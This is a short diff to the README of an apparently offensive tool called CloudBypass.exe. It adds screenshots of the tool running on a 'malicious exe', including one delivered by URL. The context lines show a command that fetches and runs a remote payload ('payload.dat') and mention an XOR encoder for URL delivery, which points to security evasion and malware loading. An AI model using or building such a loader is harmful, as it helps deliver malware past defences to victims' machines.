@@ -29,3 +29,9 @@ CloudBypass.exe https://url/payload.dat
 
 - CloudBypass.exe — main bypass tool
 - extractor.bat — drag and drop XOR encoder for URL delivery
+- Normal Run on test:
+<img width="610" height="208" alt="NormalRun" src="https://github.com/user-attachments/assets/f1a8a9a5-7b62-4318-8c4a-12a8b76e23f2" />
+Run on malicious exe:
+<img width="965" height="449" alt="Runwithbypassnourl" src="https://github.com/user-attachments/assets/08f4631b-aca6-4246-9627-e7aef65e1fa8" />
+Run on malicious exe through url:
+<img width="965" height="449" alt="Runwithbypassnourl" src="https://github.com/user-attachments/assets/2b7e052e-0e64-417d-8faa-d0931a0e0b07" />
